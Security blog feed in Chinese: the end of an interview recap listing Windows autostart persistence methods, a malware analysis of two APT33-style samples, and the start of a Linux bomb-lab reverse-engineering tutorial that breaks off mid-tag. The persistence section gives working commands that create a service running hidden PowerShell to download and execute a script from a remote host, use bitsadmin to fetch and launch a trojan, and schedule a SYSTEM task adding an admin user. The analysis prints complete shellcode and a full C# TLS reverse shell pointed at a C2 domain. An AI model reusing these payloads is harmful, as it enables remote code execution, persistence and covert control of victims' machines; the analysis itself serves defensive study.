alt="shellcode_2"></p><blockquote><ul><li>问：没有写过脱壳器？或者手工脱个壳子一类的？<br><br>答：这个我自己还真没有尝试写过脱壳器，手工脱壳也是特别简单的upx,自己主要还是脚本类型的代码审计的比较多，而且做样本分析也多是APT类的样本，主要就算js,vbs,ps1,一类，而且多是函数名，变量名混淆，在二进制层面见得比较多的也是ollvm混淆，c#也有混淆器，但在最近的样本中都没遇见。</li></ul></blockquote><blockquote><ul><li>问：有没有了解AES加密算法？<br><br>答：加密算法类，确实有一点了解，AES能看懂虽然不是很深入，但国密，特别是SM4加密算法，自己有写过，用c#和go来实现，写了不下三遍。</li></ul></blockquote><blockquote><ul><li>问：有没有看过windows内核驱动？或者自己写过相关的驱动程序？<br><br>答：windows内核的确实还没好好看过，这个确实比较尴尬。</li></ul></blockquote><blockquote><ul><li>问:有没有分析过勒索类或者蠕虫类的样本？<br><br>答：这个确实有点迷了，自己分析得最多的还是rat，后门类的样本，其中脚本类型偏多，多是利用文档类型漏洞，比较有意思的就算利用lnk文件的钓鱼操作，勒索类的确实没有分析过，蠕虫类，也仅仅看过webshell类的蠕虫感染。这个有时间得补上</li></ul></blockquote><blockquote><ul><li>问：windows平台自启有几种方式？<br><br>答：当时只知道有三种（注册表，启动目录，计划任务），后面问大佬才知道最少有6总，我下面做了一份总结。</li></ul></blockquote><h2 id="心得总结"><a href="#心得总结" class="headerlink" title="心得总结"></a>心得总结</h2><h3 id="感想："><a href="#感想：" class="headerlink" title="感想："></a>感想：</h3><p>面试体现出来，我自己还是存在很多问题，当时稍微有点点乱，可能导致回答时，有些没说清楚，还有就是技术上的知识欠缺，所以回头抓紧时间补起来，后天期末考试，考完在把一些帖子补起来。</p><h3 id="windows平台开机自启方式总结"><a href="#windows平台开机自启方式总结" class="headerlink" title="windows平台开机自启方式总结"></a>windows平台开机自启方式总结</h3><table border=0 cellpadding=0 cellspacing=0 width=1552 style='text-align:center;border-collapse: collapse;table-layout:fixed;width:1164pt'> <col width=186 style='text-align:center;mso-width-source:userset;mso-width-alt:6627;width:140pt'> <col width=724 style='text-align:center;mso-width-source:userset;mso-width-alt:25742;width:543pt'> <col width=578 style='text-align:center;mso-width-source:userset;mso-width-alt:20536;width:433pt'> <col width=64 style='text-align:center;width:48pt'> <tr height=18 style='text-align:center;height:13.8pt'>  <td colspan=3 height=18 class=xl67 width=1488 style='text-align:center;height:13.8pt;  width:1116pt;'>利用注册表的方式实现自启</td>  <td class=xl67 width=64 style='text-align:center;width:48pt'></td> </tr> <tr height=18 style='text-align:center;height:13.8pt'>  <td height=18 class=xl67 style='text-align:center;height:13.8pt'>注册键</td>  <td class=xl66>路径</td>  <td class=xl67>注释</td>  <td class=xl67></td> </tr> <tr height=18 style='text-align:center;height:13.8pt'>  <td height=18 class=xl67 style='text-align:center;height:13.8pt'>Load</td>  <td class=xl66>HKEY_CURRENT_USER\Software\Microsoft\Windows  NT\CurrentVersion\Windows\load</td>  <td class=xl67>这个解释没找到，我查看我本机时也为找到（求大佬指点）</td>  <td class=xl67></td> </tr> <tr height=18 style='text-align:center;mso-height-source:userset;height:13.8pt'>  <td height=18 class=xl66 style='text-align:center;height:13.8pt'>Userinit</td>  <td class=xl66>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows  NT\CurrentVersion\Winlogon\Userinit</td>  <td class=xl67>这里也能够使系统启动时自动初始化程序。</td>  <td class=xl67></td> </tr> <tr height=18 style='text-align:center;height:13.8pt'>  <td rowspan=2 height=41 class=xl66 style='text-align:center;height:31.2pt'>Explorer\Run</td>  <td class=xl66>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</td>  <td class=xl67>对当前用户生效</td>  <td class=xl67></td> </tr> <tr height=23 style='text-align:center;mso-height-source:userset;height:17.4pt'>  <td height=23 class=xl66 style='text-align:center;height:17.4pt'>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</td>  <td class=xl67>对所有用户生效</td>  <td class=xl67></td> </tr> <tr height=18 style='text-align:center;height:13.8pt'>  <td rowspan=2 height=36 class=xl66 style='text-align:center;height:27.6pt'>RunServicesOnce</td>  <td class=xl66>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</td>  <td rowspan=2 class=xl66>用来启动服务程序，启动时间在用户登录之前，而且先于其他通过注册表键启动的程序</td>  <td class=xl67></td> </tr> <tr height=18 style='text-align:center;height:13.8pt'>  <td height=18 class=xl65 style='text-align:center;height:13.8pt'>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</td>  <td></td> </tr> <tr height=18 style='text-align:center;height:13.8pt'>  <td rowspan=2 height=36 class=xl66 style='text-align:center;height:27.6pt'>RunServices</td>  <td class=xl66>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</td>  <td rowspan=2 class=xl66>RunServices 子键也是在用户登录前及其他注册表自启动程序加载前面加载</td>  <td></td> </tr> <tr height=18 style='text-align:center;height:13.8pt'>  <td height=18 class=xl66 style='text-align:center;height:13.8pt'>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</td>  <td></td> </tr> <tr height=18 style='text-align:center;height:13.8pt'>  <td rowspan=2 height=36 class=xl66 style='text-align:center;height:27.6pt'>RunOnce\Setup</td>  <td class=xl66>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\Setup</td>  <td rowspan=2 class=xl66>RunOnce\Setup 指定了用户登录之后运行的程序</td>  <td></td> </tr> <tr height=18 style='text-align:center;height:13.8pt'>  <td height=18 class=xl66 style='text-align:center;height:13.8pt'>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce\Setup</td>  <td></td> </tr> <tr height=18 style='text-align:center;height:13.8pt'>  <td rowspan=2 height=36 class=xl66 style='text-align:center;height:27.6pt'>Run</td>  <td class=xl66>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</td>  <td rowspan=2 class=xl67>Run是自动运行程序最常用的注册键</td>  <td></td> </tr> <tr height=18 style='text-align:center;height:13.8pt'>  <td height=18 class=xl66 style='text-align:center;height:13.8pt'>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</td>  <td></td> </tr> <tr height=18 style='text-align:center;height:13.8pt'>  <td height=18 colspan=4 style='text-align:center;height:13.8pt;mso-ignore:colspan'></td> </tr></table><p>服务启动</p><pre><code class="shell">sc create &quot;name&quot; binpath= &quot;cmd /c start powershell.exe -nop -w hidden -c \&quot;IEX(((new-object net.webclient).downloadstring(&#39;http://192.168.1.82:19001/a&#39;))\&quot;&quot;SC config &quot;name&quot; start= auto //我们需要把这个name服务设置为自动。Sc description &quot;name&quot; &quot;description&quot; // 设置服务的描述字符串net start &quot;name&quot; // 启动服务SC delete &quot;name&quot; //删除这个服务，不想使用服务直接删除</code></pre><p>注意:不是所有程序都可以作为服务的方式运行,所以请看：<a href="http://www.x2009.net/articles/create-a-windows-service-methods.html" target="_blank" rel="noopener">http://www.x2009.net/articles/create-a-windows-service-methods.html</a></p><p>Bitsadmin</p><pre><code class="shell">bitsadmin /create start_test //创建任务bitsadmin /addfile start_test http://www.baidu.com/muma.exe %temp%\muma.exe //添加文件，此步骤是为下一步做铺垫，bitsadmin /SetNotifyCmdLine start_test &quot;%COMSPEC%&quot; &quot;cmd.exe /c bitsadmin.exe /complete \&quot;backdoor\&quot; &amp;&amp; start /B %temp%\muma.exe&quot;  //第二步完成之后就启动这一步bitsadmin /Resume start_test //启动下载任务</code></pre><p>启动项</p><blockquote><p>C:\Users{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p></blockquote><p>SchTasks 计划任务<br><a href="https://technet.microsoft.com/zh-cn/library/cc772785.aspx#BKMK_days" target="_blank" rel="noopener">官方文档</a></p><pre><code class="shell">Onstart:schtasks /create /tn sch /ru system /sc onstart /tr &quot;net user admin admin /add&quot;  /fOnlogin:schtasks /create /tn sch /ru system /sc onlogin /tr &quot;net user admin admin /add&quot;  /fOnidle:schtasks /create /tn sch /ru system /sc onidle /i 1 /tr &quot;net user admin admin /add&quot;  /fevery 1 min:schtasks /create /tn sch /ru system /sc MINUTE /mo 1  /tr &quot;net user admin admin /add&quot; /fevery 1 day:schtasks /create /tn sch /ru system /sc daily /mo 1  /tr &quot;net user admin admin /add&quot;  /fonince:schtasks /create /tn &quot;My App&quot; /tr c:\apps\myapp.exe /sc once /sd 01/01/2003 /st 00:00  /f</code></pre>]]></content>
      
      
      <categories>
          
          <category> 杂记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> 总结报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>两份样本分析记录总结</title>
      <link href="/2019/12/08/%E4%B8%A4%E4%BB%BD%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95%E6%80%BB%E7%BB%93/"/>
      <url>/2019/12/08/%E4%B8%A4%E4%BB%BD%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="两份样本分析记录总结"><a href="#两份样本分析记录总结" class="headerlink" title="两份样本分析记录总结"></a>两份样本分析记录总结</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h2><blockquote><p>此样本，大佬说有可能是假旗活动，暂时没法实锤是那组织，但值得一提是样本的手法和APT33的比较相似。</p></blockquote><h2 id="样本一"><a href="#样本一" class="headerlink" title="样本一:"></a>样本一:</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h3><blockquote><p>样本信息:</p></blockquote><table><thead><tr><th align="center">样本名称</th><th align="center">文件大小</th><th align="center">MD5</th></tr></thead><tbody><tr><td align="center">Launcher (scrambled).hta</td><td align="center">14.41 KB</td><td align="center">85486b71ff7234205e0d18153ac0f7ed</td></tr></tbody></table><blockquote><p>该样本类型为hta，代码里面极有可能调用ActiveXObject对象来执行WScript.Shell<br><img src="./img/simple1/hta_code1.png" alt="hta_code"></p></blockquote><blockquote><p>补充:HTA是HTML Application的缩写（HTML应用程序），是软件开发的新概念，直接将HTML保存成HTA的格式，就是一个独立的应用软件，</p></blockquote><blockquote><p>这个是uincode编码解一下，果然调用了WScript.Shell，下面还有一段是powershell的混淆<br><img src="./img/simple1/js_decode.png" alt="js_decode"></p></blockquote><blockquote><p>这里有个小技巧,我们UE修改一下代码<br><img src="./img/simple1/ue.png" alt="ue"></p></blockquote><blockquote><p>然后重新执行便可<br><img src="./img/simple1/hta_run.png" alt="hta_run"></p></blockquote><blockquote><p>很明显的base64,直接decode一下，注意decode后有这种情况:<br><img src="./img/simple1/base64_decode.png" alt="base64_decode"></p></blockquote><blockquote><p>我们直接将乱码字符删除掉就行，这个不影响,最后可以还原代码</p></blockquote><blockquote><p>稍微整理后的代码,可以看见很明显的开辟内存执行shellcode,这里也是ps1脚本核心执行流:<br><img src="./img/simple1/ps1_core.png" alt="ps1_core"></p></blockquote><blockquote><p>很明显的开辟内存执行shellcode</p></blockquote><blockquote><p>完整shellcode:</p></blockquote><blockquote><p>\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xff\xfe\xfd\xfc\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3</p></blockquote><blockquote><p>这里我们把是，shellcode丢OD里面可以看到汇编代码:</p></blockquote><pre><code class="gas">004E06D0 &gt;    FC            cld004E06D1      E8 89000000   call    004E075F004E06D6      60            pushad004E06D7      89E5          mov     ebp, esp004E06D9      31D2          xor     edx, edx004E06DB      64:8B52 30    mov     edx, dword ptr fs:[edx+30]004E06DF      8B52 0C       mov     edx, dword ptr [edx+C]004E06E2      8B52 14       mov     edx, dword ptr [edx+14]004E06E5      8B72 28       mov     esi, dword ptr [edx+28]004E06E8      0FB74A 26     movzx   ecx, word ptr [edx+26]004E06EC      31FF          xor     edi, edi004E06EE      31C0          xor     eax, eax004E06F0      AC            lods    byte ptr [esi]004E06F1      3C 61         cmp     al, 61004E06F3      7C 02         jl      short 004E06F7004E06F5      2C 20         sub     al, 20004E06F7      C1CF 0D       ror     edi, 0D004E06FA      01C7          add     edi, eax004E06FC    ^ E2 F0         loopd   short 004E06EE004E06FE      52            push    edx004E06FF      57            push    edi004E0700      8B52 10       mov     edx, dword ptr [edx+10]004E0703      8B42 3C       mov     eax, dword ptr [edx+3C]004E0706      01D0          add     eax, edx004E0708      8B40 78       mov     eax, dword ptr [eax+78]004E070B      85C0          test    eax, eax004E070D      74 4A         je      short 004E0759004E070F      01D0          add     eax, edx004E0711      50            push    eax004E0712      8B48 18       mov     ecx, dword ptr [eax+18]004E0715      8B58 20       mov     ebx, dword ptr [eax+20]004E0718      01D3          add     ebx, edx004E071A      E3 3C         jecxz   short 004E0758004E071C      49            dec     ecx004E071D      8B348B        mov     esi, dword ptr [ebx+ecx*4]004E0720      01D6          add     esi, edx004E0722      31FF          xor     edi, edi004E0724      31C0          xor     eax, eax004E0726      AC            lods    byte ptr [esi]004E0727      C1CF 0D       ror     edi, 0D004E072A      01C7          add     edi, eax004E072C      38E0          cmp     al, ah004E072E    ^ 75 F4         jnz     short 004E0724004E0730      037D F8       add     edi, dword ptr [ebp-8]004E0733      3B7D 24       cmp     edi, dword ptr [ebp+24]004E0736    ^ 75 E2         jnz     short 004E071A004E0738      58            pop     eax004E0739      8B58 24       mov     ebx, dword ptr [eax+24]004E073C      01D3          add     ebx, edx004E073E      66:8B0C4B     mov     cx, word ptr [ebx+ecx*2]004E0742      8B58 1C       mov     ebx, dword ptr [eax+1C]004E0745      01D3          add     ebx, edx004E0747      8B048B        mov     eax, dword ptr [ebx+ecx*4]004E074A      01D0          add     eax, edx004E074C      894424 24     mov     dword ptr [esp+24], eax004E0750      5B            pop     ebx004E0751      5B            pop     ebx004E0752      61            popad004E0753      59            pop     ecx004E0754      5A            pop     edx004E0755      51            push    ecx004E0756      FFE0          jmp     eax004E0758      58            pop     eax004E0759      5F            pop     edi004E075A      5A            pop     edx004E075B      8B12          mov     edx, dword ptr [edx]004E075D    ^ EB 86         jmp     short 004E06E5004E075F      5D            pop     ebp004E0760      68 33320000   push    3233004E0765      68 7773325F   push    5F327377004E076A      54            push    esp004E076B      68 4C772607   push    726774C004E0770      FFD5          call    ebp004E0772      B8 90010000   mov     eax, 190004E0777      29C4          sub     esp, eax004E0779      54            push    esp004E077A      50            push    eax004E077B      68 29806B00   push    6B8029004E0780      FFD5          call    ebp004E0782      50            push    eax004E0783      50            push    eax004E0784      50            push    eax004E0785      50            push    eax004E0786      40            inc     eax004E0787      50            push    eax004E0788      40            inc     eax004E0789      50            push    eax004E078A      68 EA0FDFE0   push    E0DF0FEA004E078F      FFD5          call    ebp004E0791      97            xchg    eax, edi004E0792      6A 05         push    5004E0794      68 FFFEFDFC   push    FCFDFEFF004E0799      68 020001BB   push    BB010002004E079E      89E6          mov     esi, esp004E07A0      6A 10         push    10004E07A2      56            push    esi004E07A3      57            push    edi004E07A4      68 99A57461   push    6174A599004E07A9      FFD5          call    ebp004E07AB      85C0          test    eax, eax004E07AD      74 0C         je      short 004E07BB004E07AF      FF4E 08       dec     dword ptr [esi+8]004E07B2    ^ 75 EC         jnz     short 004E07A0004E07B4      68 F0B5A256   push    56A2B5F0004E07B9      FFD5          call    ebp004E07BB      6A 00         push    0004E07BD      6A 04         push    4004E07BF      56            push    esi004E07C0      57            push    edi004E07C1      68 02D9C85F   push    5FC8D902004E07C6      FFD5          call    ebp004E07C8      8B36          mov     esi, dword ptr [esi]004E07CA      6A 40         push    40004E07CC      68 00100000   push    1000004E07D1      56            push    esi004E07D2      6A 00         push    0004E07D4      68 58A453E5   push    E553A458004E07D9      FFD5          call    ebp004E07DB      93            xchg    eax, ebx004E07DC      53            push    ebx004E07DD      6A 00         push    0004E07DF      56            push    esi004E07E0      53            push    ebx004E07E1      57            push    edi004E07E2      68 02D9C85F   push    5FC8D902004E07E7      FFD5          call    ebp004E07E9      01C3          add     ebx, eax004E07EB      29C6          sub     esi, eax004E07ED      85F6          test    esi, esi004E07EF    ^ 75 EC         jnz     short 004E07DD004E07F1      C3            retn</code></pre><blockquote><p>此shellcode，和cs生成的shellcode,大致相同，我手动调了一下，但是win上的逆向我太菜了，没看懂。</p></blockquote><blockquote><p>此样本的特点就是调用powershell,来开辟内存执行shellcode,这是核心。<br>其攻击流程，any,run上给出的进程图基本相同，但shellcode我没调动，就没继续跟了，如同所示:<br><img src="./img/simple1/%E6%B5%81%E7%A8%8B%E5%9B%BE.png" alt="流程图"></p></blockquote><blockquote><p>此样本的手法,还是有不错的免杀效果:<br><img src="./img/simple1/virustotal.png" alt="virustotal1"></p></blockquote><h2 id="样本二"><a href="#样本二" class="headerlink" title="样本二:"></a>样本二:</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析:"></a>分析:</h3><blockquote><p>样本信息:</p></blockquote><table><thead><tr><th align="center">样本名称</th><th align="center">文件大小</th><th align="center">MD5</th></tr></thead><tbody><tr><td align="center">2.2.CS_revs-MWC-MP.xls</td><td align="center">134.00 Kb</td><td align="center">43f1424da62a50e01db5f3acd86bfa00</td></tr></tbody></table><blockquote><p>此样本第一步利用宏代码来释放载荷<br><img src="./img/simple2/vbs_code1.png" alt="vbs_code1"></p></blockquote><blockquote><p>此函数主要做hex解码工作<br><img src="./img/simple2/hex_code.png" alt="hex_code"></p></blockquote><blockquote><p>这是vbs核心执行流,在这里通过上面的hex字符串解码出一个c#代码文件,和xml模板文件<br><img src="./img/simple2/vbs_core.png" alt="vbs_core"></p></blockquote><blockquote><p>很明显此处调用了<code>Microsoft.Workflow.Compiler.exe</code>来动态编译载荷,我们将上面这个base64的字符解码出来,可以得到两个文件:notes.txt,important.txt</p></blockquote><blockquote><p>其中notes.txt是c#代码,如下:</p></blockquote><pre><code class="csharp">using System;using System.Text;using System.IO;using System.Diagnostics;using System.Net.Sockets;using System.Security.Cryptography.X509Certificates;using System.Net.Security;using System.Security.Authentication;using System.Workflow.Activities;public class Ovoda : SequentialWorkflowActivity{    static StreamWriter streamWriter;    public Ovoda()    {        string host = &quot;sts.gtabnk.com&quot;;        int port = Int32.Parse(&quot;443&quot;);        string envvar = &quot;cmd.exe&quot;;        string arguments = &quot; &quot;;         int xorkey = Int32.Parse(&quot;00&quot;);        string envvar1 = &quot;&quot;;        for (int i = 0; i &lt; envvar.Length; i++)        {            char c = (char)(envvar[i] ^ xorkey);            envvar1 += c;        }        //Console.WriteLine(&quot;executing {0} {3} and redirecting stdout / stderr to {1}:{2}&quot;, envvar1, host, port, arguments);        using (TcpClient client = new TcpClient(host, port))        {            using (SslStream stream = new SslStream(client.GetStream(), false, new RemoteCertificateValidationCallback(ValidateServerCertificate), null))            {                stream.AuthenticateAsClient(host, null, SslProtocols.Tls12, false);                using (StreamReader rdr = new StreamReader(stream))                {                    streamWriter = new StreamWriter(stream);                    StringBuilder strInput = new StringBuilder();                    StringBuilder veliyepo = new StringBuilder();                    veliyepo.Append(&quot;exit&quot;);                    Process p = new Process();                    //p.StartInfo.FileName = System.Environment.GetEnvironmentVariable(envvar1);                     p.StartInfo.FileName = envvar1;                    p.StartInfo.Arguments = arguments;                    p.StartInfo.CreateNoWindow = true;                    p.StartInfo.UseShellExecute = false;                    p.StartInfo.RedirectStandardOutput = true;                    p.StartInfo.RedirectStandardInput = true;                    p.StartInfo.RedirectStandardError = true;                    p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);                    p.ErrorDataReceived += new DataReceivedEventHandler(CmdErrorDataHandler);                    p.Start();                    p.BeginOutputReadLine();                    p.BeginErrorReadLine();                    while (true)                    {                        strInput.Append(rdr.ReadLine());                        //Console.WriteLine(&quot;Excuting: {0}&quot;, strInput);                        //if (strInput == veliyepo)                        //{                        //    p.StandardInput.WriteLine(&quot;exit&quot;);                        //    break;                        //}                        p.StandardInput.WriteLine(strInput);                        strInput.Remove(0, strInput.Length);                    }                }            }        }    }    public static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)    {        // 100% correct way of validating the cert.        return true;    }    private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)    {        StringBuilder strOutput = new StringBuilder();        if (!String.IsNullOrEmpty(outLine.Data))        {            try            {                strOutput.Append(outLine.Data);                streamWriter.WriteLine(strOutput);                streamWriter.Flush();            }            catch (Exception) { }        }    }    private static void CmdErrorDataHandler(object sendingProcess, DataReceivedEventArgs outLine)    {        StringBuilder strOutput = new StringBuilder();        if (!String.IsNullOrEmpty(outLine.Data))        {            try            {                strOutput.Append(outLine.Data);                streamWriter.WriteLine(strOutput);                streamWriter.Flush();            }            catch (Exception) { }        }    }}</code></pre><blockquote><p>很明显,里面已经暴露c2地址,<br>important.txt就是一份xml文档,用于编译<br>关于MWC动态编译代码过免杀可以参考这篇文章:<a href="https://www.freebuf.com/articles/system/182501.html" target="_blank" rel="noopener">如何利用Microsoft.Workflow.Comiler.exe执行未签名的任意代码</a><br>这里提一句:Microsoft.Workflow.Comiler.exe这个程序需要4.0以上的.NET才有</p></blockquote><blockquote><p>实际上这份样本有个有意思的地方<br><img src="./img/simple2/vmcheck.png" alt="vmcheck"></p></blockquote><blockquote><p>这是一个虚拟机检测,导致any.run上并没有给出进程图</p></blockquote><blockquote><p>此样本的手法主要就是利用宏代码,Hex_Encode,base64隐藏代码,这个手法也很向APT33,此手法在virustotal上检测现在也仅有12家报毒,火绒现在已杀<br><img src="./img/simple2/virustotal.png" alt="virustotal2"></p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h2><blockquote><p>此次分析,针对两个样本,主要是脚本代码类型的分析,文中也许有很多地方没有讲到,而是直接上修复或整理后的代码,不得不说恶意代码分析,在脚本类型这一块主要就是混淆,高强度的混淆对分析人员来说是一个很大的挑战,需要代码功底足够扎实,因为不仅仅一种语言,各种各样的脚本,但多是大同小异,所以扎实代码功底可以让我们应付起来要轻松一些,样本一的shellcode,有时间我还会在继续调试追踪,看看能不能分析出来,win32平台上的分析,我还是菜了很多</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 样本分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APT </tag>
            
            <tag> 恶意代码分析 </tag>
            
            <tag> office宏代码 </tag>
            
            <tag> hta恶意代码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从一道简单的逆向题到入门</title>
      <link href="/2019/12/04/%E4%BB%8E%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%84%E9%80%86%E5%90%91%E9%A2%98%E5%88%B0%E5%85%A5%E9%97%A8-%E6%95%99%E7%A8%8B/"/>
      <url>/2019/12/04/%E4%BB%8E%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%84%E9%80%86%E5%90%91%E9%A2%98%E5%88%B0%E5%85%A5%E9%97%A8-%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="从一道简单的逆向题到入门"><a href="#从一道简单的逆向题到入门" class="headerlink" title="从一道简单的逆向题到入门"></a>从一道简单的逆向题到入门</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><blockquote><p>Blog重建，丢失好多帖子，找个机会补一篇Linux的逆向分析入门，给小白入门学习用，大佬绕过。</p></blockquote><blockquote><p>朋友喊帮忙看看,就顺手写下一篇逆向入门教程吧<br><img src="./img/%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95.png" alt="聊天记录"></p></blockquote><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h3><p>文件信息:</p><blockquote><p><img src="./img/file-info.jpg" alt="file-info"></p></blockquote><blockquote><p>可以看到从命令行里传入两个参数，第一个就是该执行文件的当前path，第二个就是传入另一个文件，如果存在能打开那么就将输入重定向到infile, 否则重定向到stdin，也就是标准输入。<br><img src="./img/ida1.png" alt="ida1"></p></blockquote><p><code>补充：</code></p><table><thead><tr><th align="center">变量</th><th align="center">值</th><th align="center">信息</th></tr></thead><tbody><tr><td align="center">stdin</td><td align="center">0</td><td align="center">标准输入</td></tr><tr><td align="center">stdout</td><td align="center">1</td><td align="center">标准输出</td></tr><tr><td align="center">stderr</td><td align="center">2</td><td align="center">标准错误</td></tr></tbody></table><h3 id="initialize-bomb"><a href="#initialize-bomb" class="headerlink" title="initialize_bomb"></a>initialize_bomb</h3><blockquote><p>此函数设置一个信号量<br><img src="./img/initbomb.png" alt="initialize_bomb函数"></p></blockquote><h3 id="read-line"><a href="#read-line" class="headerlink" title="read_line"></a>read_line</h3><blockquote><p>read_line函数就对输入做一下简单的处理，读取一行。因为之前有输入有可能是从文件获取，同时获取一下环境变量GRADE_BOMB的值。<br><img src="./img/readline.png" alt="read_line"></p></blockquote><h3 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h3><blockquote><p>这个就拿输入和<code>aWhyMakeTrillio</code>全局变量做了一个比较so我们直接去拿下来就行了<br><img src="./img/phase1.1.png" alt="phase1.1"></p></blockquote><blockquote><p><img src="./img/phase1.png" alt="phase_1"></p></blockquote><blockquote><p>如果不等于这个值就会执行explode_bomb函数,直接退出程序<br><img src="./img/explode_bomb.png" alt="explode"></p></blockquote><h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h3><blockquote><p>读入6个数，然后前三个等于后个不相等则退出<br><img src="./img/phase2.png" alt="phase_2"></p></blockquote><blockquote><p><img src="./img/phase2.2.png" alt="read_six_numbers"></p></blockquote><blockquote><p>so 我们输入1 2 3 1 2 3就可以了</p></blockquote><h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h3><blockquote><p>是不是看着很吓人，实际上不要慌，他就一张switch表，我们先倒着看<br><img src="./img/phase3.png" alt="phase_3"></p></blockquote><blockquote><p>这里比较了var_11和al不相等则结束，<br><img src="./img/phase3.1.png" alt="phase3.1"></p></blockquote><blockquote><p>这里赋值了eax为’q’,也就控制了刚才的al,同时修改了var_10为84，但是进入条件是case 1<br><img src="./img/phase3.3.png" alt="phase3.3"></p></blockquote><blockquote><p>这里进行输入赋值由于是64位的，通常顺序是rdi, rsi, rdx, rcx, r8, r9, 栈<br><img src="./img/phase3.2.png" alt="phase3.2"></p></blockquote><blockquote><p>结合上面的简单分析，我们需要输入 <code>1 q 84</code>就能通过，实际上还可以看看其他表是做啥都差不多</p></blockquote><h3 id="phase4"><a href="#phase4" class="headerlink" title="phase4"></a>phase4</h3><blockquote><p>就是输入一个数，然后经过一个<code>func4</code>计算后和这个<code>0x375F00</code>比较不相等就退出，<br><img src="./img/phase4.png" alt="phase4"></p></blockquote><blockquote><p>我们看看func4函数<br>实际上就一个递归计算阶乘很简单，imul指令是相乘嘛。<br>我们爆破一下就知道了<br><img src="./img/phase4.1.png" alt="func4"></p></blockquote><blockquote><p>可以看到结果就是10<br><img src="./img/phase4.2.png" alt="result"></p></blockquote><h3 id="phase5"><a href="#phase5" class="headerlink" title="phase5"></a>phase5</h3><blockquote><p>就把我们的输入当作索引取这个数组里面取值然后做比较需要等于<code>ravens</code><br><img src="./img/phase5.png" alt="phase5"></p></blockquote><p><img src="./img/phase5.1.png" alt="phase5.1"></p><blockquote><p>这是结果但这里有个坑，只能输入如6个字符，11是两个字符了，所以这里我们可以借pwntools来简单处理一下，比较方便<br><img src="./img/phase5.2.png" alt="phase5.2"></p></blockquote><p><img src="./img/phase5.3.png" alt="phase5.3"></p><p><img src="./img/phase5.4.png" alt="phase5.4"></p><h3 id="phase6"><a href="#phase6" class="headerlink" 